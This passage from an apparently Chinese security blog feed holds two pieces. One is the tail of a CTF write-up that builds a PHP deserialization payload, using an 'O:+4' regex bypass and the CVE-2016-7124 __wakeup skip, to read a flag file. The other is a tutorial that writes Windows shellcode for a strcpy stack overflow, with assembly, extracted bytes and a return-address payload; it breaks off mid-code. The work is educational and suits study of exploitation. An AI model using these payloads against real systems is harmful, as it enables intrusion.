href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p></blockquote><p>接下来分析<code>Demo</code>类，</p><ol><li>执行<code>__construct()</code>方法，将传入的 <code>$file</code> 赋值给本地的<strong>私有</strong>方法 <code>$file</code></li><li>销毁时执行 <code>__destruct()</code> 方法，高亮本地变量 <code>$file</code>所指向 文件的代码</li></ol><p>这里需要注意第12行的注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//the secret is in the fl4g.php</span></span><br></pre></td></tr></table></figure><p>明示了我们flag在<code>fl4g.php</code>文件中</p><h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022095600381.png" alt="image-20201022095600381"></p><blockquote><p>更详细的说明，参考：<a href="https://www.cnblogs.com/youyoui/p/8610068.html">深度剖析PHP序列化和反序列化</a></p></blockquote><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>我们需要注意两个点，上面的代码是从17行开始执行的，而且<code>unserialize()</code>方法的参数来源与GET请求，请求值经过了<code>base64</code> 和 正则匹配， 主要的是<font color="red">参数是可控的（对与我们来说）</font></p><p>还有一个要注意的点就是<code>__wakeup()</code>方法，因为我们的flag在<code>fl4g.php</code>文件中，所以我们需要绕过<code>__wakeup()</code>函数，这里就可以利用<code>CVE-2016-7124</code>的漏洞：<font color="red">即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行</font></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)</span><br></pre></td></tr></table></figure><p>还有一点说明，就是这里正则匹配的规则是: <strong>在不区分大小写的情况下 ， 若字符串出现 “o:数字” 或者 “c:数字’ 这样的格式 ， 那么就被过滤</strong> . 而<code>serialize()</code> 的参数为 object ，因此参数类型肯定为对象 “ O “ ， 又因为序列化字符串的格式为 <code>参数格式:参数名长度</code> ， 因此 <code>&quot; O:4 &quot;</code> 这样的字符串肯定无法通过正则匹配</p><p>绕过正则的匹配，我们可以在<code>4</code>加上<code>+</code>来绕过，因为在 php 语法中，<code>+4</code> = <code>4</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> +<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">-4</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022101504648.png" alt="image-20201022101504648"></p><blockquote><p>更深入的了解可以参考：<a href="https://www.phpbug.cn/archives/32.html">php反序列unserialize的一个小特性</a></p></blockquote><p>绕过<code>__wakeup()</code>，这里就可以利用<code>CVE-2016-7124</code>的漏洞：<font color="red">即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行</font></p><h2 id="构造pyload"><a href="#构造pyload" class="headerlink" title="构造pyload"></a>构造pyload</h2><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022101902130.png" alt="image-20201022101902130"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$t = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">$b = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $b.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>; <span class="comment">// O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">$b = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, $b); <span class="comment">//绕过preg_match</span></span><br><span class="line">$b = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, $b);  <span class="comment">//绕过__wakeup</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $b.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>; <span class="comment">// O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode($b);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码为什么用<code>str_replace()</code>替换，而不是直接复制粘贴，然后编码呢? 这就涉及到私有属性序列化以后，会产生<code>%00</code>的问题，后面详细分析， 我们通过思路，构造payload如下：</p><p><code>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022102111486.png" alt="image-20201022102111486"></p><p><strong>解释一下上面的问题</strong></p><p><code>Demo</code>类序列化的结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;Demo&quot;</span>:1:&#123;s:10:<span class="string">&quot;Demofile&quot;</span>;s:8:<span class="string">&quot;fl4g.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>注意<code>s:10:&quot;Demofile&quot;</code>, 明明<code>Demofile</code>是8个字符， 为什么这里显示s:10呢?</p><p>为了更清晰的显示为什么，我们用<code>urlencode()</code>打印上面的值</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022102906234.png" alt="image-20201022102906234"></p><p>这里<code>s:10</code>, 就是因为这里两个<code>%00</code>导致的。</p><p>这里为什么要说这个？<code>%00</code>有什么影响嘛?</p><p><font color="red">这里的坑就在</font>：如果我们直接复制文本进行base64编码，会丢失<code>%00</code>, 再 <code>解码-&gt;反序列化</code> 自然与我之前序列化的 Demo <code>不相同</code></p><p>对于这里，解决方法就是，使用<code>str_replace</code>替换， 我们通过对比，来观察一下他们有什么不同：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$t = <span class="keyword">new</span> Demo(<span class="string">&#x27;fl4g.php&#x27;</span>);</span><br><span class="line">$b = serialize($t);</span><br><span class="line"><span class="keyword">echo</span> $b.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>; <span class="comment">// O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span></span><br><span class="line">$b = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, $b); <span class="comment">//绕过preg_match</span></span><br><span class="line">$b = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, $b);  <span class="comment">//绕过__wakeup</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&#x27;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_decode(<span class="string">&quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_decode(<span class="string">&quot;TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201022104425304.png" alt="image-20201022104425304"></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ul><li>php 中 <code>4</code> = <code>+4</code> ，可以用来绕过正则匹配</li><li>绕过<code>__wakeup()</code>，这里就可以利用<code>CVE-2016-7124</code>的漏洞：<font color="red">即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过<code>__wakeup</code>的执行</font></li><li>私有属性(<code>private</code>)列化后， 会在属性名前加上类名，类名的左右会加有<code>%00</code></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span cl</summary>
      
    
    
    
    <category term="网络安全" scheme="http://www.ywboy.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="CTF" scheme="http://www.ywboy.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>shellcode编写(三)</title>
    <link href="http://www.ywboy.cn/2020/10/06/shellcode%E7%BC%96%E5%86%99-%E4%B8%89/"/>
    <id>http://www.ywboy.cn/2020/10/06/shellcode%E7%BC%96%E5%86%99-%E4%B8%89/</id>
    <published>2020-10-06T00:31:03.000Z</published>
    <updated>2020-10-28T07:30:41.596Z</updated>
    
    <content type="html"><![CDATA[<pre><code>切入正题，这次我们进行shellcode编写，只是基础的编写，不会涉及的太复杂，我们这次编写的shellcode就是让程序自动弹出一个对话框，我这里使用的c语言中的`MessageBox()`这个函数来进行编写。</code></pre><p>我们首先需要做的就是获取调用<code>MessageBox()</code>这个函数的API.所以说，我们就需要获取该函数的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        HINSTANCE LibHandle;</span><br><span class="line">        MYPROC ProcAdd;</span><br><span class="line">        LibHandle = LoadLibrary(<span class="string">&quot;user32&quot;</span>);</span><br><span class="line">        <span class="comment">//获取user32.dll的地址</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;user32 = 0x%x\n&quot;</span>, LibHandle);</span><br><span class="line">        <span class="comment">//获取MessageBoxA的地址</span></span><br><span class="line">        ProcAdd=(MYPROC)GetProcAddress(LibHandle,<span class="string">&quot;MessageBoxA&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;MessageBoxA = 0x%x\n&quot;</span>, ProcAdd);</span><br><span class="line">getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118143415777.png" alt="image-20200118143415777"></p><p><code>MessageBox()</code>函数在我们系统中的地址为<code>0x77d507ea</code>         当然这个地址在不同的系统中，应该是不同的，所以我们在编写ShellCode之前，一定要先查找所要调用的API函数的地址 ，由于我们利用溢出操作破坏了原本的栈空间的内容，这就可能会在我们的对话框显示完后，导致程序崩溃，所以为了谨慎起见，我们这里还需要使用ExitProcess()函数来令程序终止。这个函数位于kernel32.dll里面，所以这里同样可以使用上述程序进行函数地址的查找，只要稍微修改一下就可以了： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">        HINSTANCE LibHandle;</span><br><span class="line">        MYPROC ProcAdd;</span><br><span class="line">        LibHandle = LoadLibrary(<span class="string">&quot;kernel32&quot;</span>);  <span class="comment">// 这里</span></span><br><span class="line">        <span class="comment">//获取user32.dll的地址</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;kernel32 = 0x%x\n&quot;</span>, LibHandle);</span><br><span class="line">        <span class="comment">//获取MessageBoxA的地址</span></span><br><span class="line">        ProcAdd=(MYPROC)GetProcAddress(LibHandle,<span class="string">&quot;ExitProcess&quot;</span>); <span class="comment">// 这里</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ExitProcess = 0x%x\n&quot;</span>, ProcAdd);</span><br><span class="line">getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下:</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118143722638.png" alt="image-20200118143722638"></p><p><code>ExitProcess()</code>地址是<code>0x7c81cafa</code></p><p>接下来，我们就开始编写汇编代码。</p><p>  在汇编语言中，想调用某个函数，是需要使用CALL语句的，而在CALL语句的后面，需要跟上该函数在系统中的地址。因为我刚才已经获取到了<code>MessageBox()</code>与<code>ExitProcess()</code>函数的地址，所以我们在这里就可以通过CALL相应的地址的方法来调用相应的函数。但是实际上，我们在编程的时候，一般还是先将地址赋给诸如eax这样的寄存器，然后再CALL相应的寄存器，从而实现调用的  。</p><p>如果说我们想要调用的函数还包含有参数，那么我们就需要先将参数利用PUSH语句从右至左分别入栈，之后再调用CALL语句。比如现在有一个<code>Function(a,b,c)</code>函数，我们想调用它，那么它的汇编代码就应该编写为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push c</span><br><span class="line">push b</span><br><span class="line">push a</span><br><span class="line">mov eax,Addrssfunction</span><br><span class="line">call eax</span><br></pre></td></tr></table></figure><p>根据这个思想，我们就可以在VC++中利用内联汇编来调用<code> ExitProcess()</code>这个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor ebx,ebx # ebx &#x3D; 0</span><br><span class="line">push ebx</span><br><span class="line">mov eax, 0x7c81cafa</span><br><span class="line">call eax</span><br></pre></td></tr></table></figure><p>接下来编写MessageBox()这个函数调用。与上一个函数不同的是，这个API函数包含有四个参数，当然第一和第四个参数，我们可以赋给0值，但是中间两个参数都包含有较长的字符串，这时候就要把所需要用到的字符串转换为ASCII码值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 然后将每四个字符为一组，进行分组，将不满四个字符的，以空格（x20）进行填充</span><br><span class="line">warning:</span><br><span class="line">\x57\x61\x72\x6e</span><br><span class="line">\x69\x6e\x67\x20</span><br><span class="line">You have been hacked!(by Taoy):</span><br><span class="line">\x59\x6f\x75\x20</span><br><span class="line">\x68\x61\x76\x65</span><br><span class="line">\x20\x62\x65\x65</span><br><span class="line">\x6e\x20\x68\x61</span><br><span class="line">\x63\x6b\x65\x64</span><br><span class="line">\x21\x28\x62\x79</span><br><span class="line">\x20\x54\x61\x6f</span><br><span class="line">\x79\x29\x20\x20</span><br></pre></td></tr></table></figure><p>​         这里之所以需要以x20进行填充，而不是x00进行填充，就是因为我们现在所利用的是strcpy的漏洞，而这个函数只要一遇到x00就会认为我们的字符串结束了，就不会再拷贝x00后的内容了  </p><p>  由于我们的计算机是小端显示，因此字符的进展顺序是从后往前不断进栈的，即Warning的进栈顺序为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 0x20676e69</span><br><span class="line">push 0x6e726157 &#x2F;&#x2F; push &quot;Warning&quot;</span><br></pre></td></tr></table></figure><p>我们如何获取这两个字符串的地址 ? 我们可以利用esp指针，因为esp始终指向栈顶的位置，所以我们将字符压入栈以后，将esp的值赋给别的相应的寄存器即可<code>mov eax,esp</code> 或 <code>mov ebx,esp</code></p><p>如此，我们在进行函数的调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov eax, 0x77d507ea</span><br><span class="line">call eax &#x2F;&#x2F; call MessageBox</span><br></pre></td></tr></table></figure><p>我们将代码写入vc6.0++, 完整代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">_asm&#123;</span><br><span class="line">sub esp,<span class="number">0x50</span></span><br><span class="line"><span class="keyword">xor</span> ebx,ebx</span><br><span class="line">push ebx     <span class="comment">// cut string</span></span><br><span class="line">push <span class="number">0x20676e69</span>   </span><br><span class="line">push <span class="number">0x6e726157</span>    <span class="comment">// push &quot;Warning&quot;</span></span><br><span class="line">mov eax,esp</span><br><span class="line">push ebx             <span class="comment">// cut string  </span></span><br><span class="line">push <span class="number">0x20202979</span></span><br><span class="line">push <span class="number">0x6f615420</span></span><br><span class="line">push <span class="number">0x79622821</span></span><br><span class="line">push <span class="number">0x64656b63</span></span><br><span class="line">push <span class="number">0x6168206e</span></span><br><span class="line">push <span class="number">0x65656220</span></span><br><span class="line">push <span class="number">0x65766168</span></span><br><span class="line">push <span class="number">0x20756f59</span>    <span class="comment">// push &quot;You have been hacked!(by Taoy)&quot;</span></span><br><span class="line">mov ecx,esp        </span><br><span class="line"></span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push ecx</span><br><span class="line">push ebx</span><br><span class="line">mov eax,<span class="number">0x77d507ea</span></span><br><span class="line">call eax           <span class="comment">// call MessageBox</span></span><br><span class="line">push ebx</span><br><span class="line">mov eax, <span class="number">0x7c81cafa</span></span><br><span class="line">call eax            <span class="comment">// call ExitProcess</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们通过调试来提取shellcode.</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118150649315.png" alt="image-20200118150649315"></p><p>按下<code>F9</code>左侧有个红色的圆圈出现后，然后按<code>F5</code>进入调试，然后<code>alt + 8</code>,显示机器码</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20200118150848143.png" alt="image-20200118150848143"></p><p>将这个汇编指令转换的机器码提取出来即可,提取完机器码, 完整的shellcode以及程序代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">char name[] &#x3D;</span><br><span class="line">&quot;\x41\x41\x41\x41\x41\x41\x41\x41&quot; &#x2F;&#x2F;name[0]~name[7]</span><br><span class="line">&quot;\x42\x42\x42\x42&quot;&#x2F;&#x2F;EBP</span><br><span class="line">&quot;\x79\x5b\xe3\x77&quot;&#x2F;&#x2F;ReturnAddress</span><br><span class="line">&quot;\x83\xEC\x50&quot;&#x2F;&#x2F;subesp,0x50</span><br><span class="line">&quot;\x33\xDB&quot;&#x2F;&#x2F;xorebx,ebx</span><br><span class="line">&quot;\x53&quot;&#x2F;&#x2F;pushebx</span><br><span class="line">&quot;\x68\x69\x6E\x67\x20&quot;</span><br><span class="line">&quot;\x68\x57\x61\x72\x6E&quot;&#x2F;&#x2F;push&quot;Warning&quot;</span><br><span class="line">&quot;\x8B\xC4&quot;&#x2F;&#x2F;moveax,esp</span><br><span class="line">&quot;\x53&quot;&#x2F;&#x2F;pushebx</span><br><span class="line">&quot;\x68\x79\x29\x20\x20&quot;</span><br><span class="line">&quot;\x68\x20\x54\x61\x6f&quot;</span><br><span class="line">&quot;\x68\x21\x28\x62\x79&quot;</span><br><span class="line">&quot;\x68\x63\x6B\x65\x64&quot;</span><br><span class="line">&quot;\x68\x6E\x20\x68\x61&quot;</span><br><span class="line">&quot;\x68\x20\x62\x65\x65&quot;</span><br><span class="line">&quot;\x68\x68\x61\x76\x65&quot;</span><br><span class="line">&quot;\x68\x59\x6F\x75\x20&quot;&#x2F;&#x2F;push&quot;Youhavebeenhacked!(byJ.Y.)&quot;</span><br><span class="line">&quot;\x8B\xCC&quot;&#x2F;&#x2F;movecx,esp</span><br><span class="line">&quot;\x53&quot;&#x2F;&#x2F;pushebx</span><br><span class="line">&quot;\x50&quot;&#x2F;&#x2F;pusheax</span><br><span class="line">&quot;\x51&quot;&#x2F;&#x2F;pushecx</span><br><span class="line">&quot;\x53&quot;&#x2F;&#x2F;pushebx</span><br><span class="line">&quot;\xB8\xea\x07\xd5\x77&quot;</span><br><span class="line">&quot;\xFF\xD0&quot;&#x2F;&#x2F;callMessageBox</span><br><span class="line">&quot;\x53&quot;</span><br><span class="line">&quot;\xB8\xFA\xCA\x81\x7C&quot;</span><br><span class="line">&quot;\xFF\xD0&quot;;</span><br></pre></td></tr></table></figure><p>由于我们这里调用了MessageBox，因此需要在源程序中加入LoadLibrary(“user32.dll”);这条语句用于加载相应的动态链接库，而由于使用了<code>LoadLibrary()</code>，还需要加入<code>windows.h</code>这个头文件。</p><p>此时代码为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 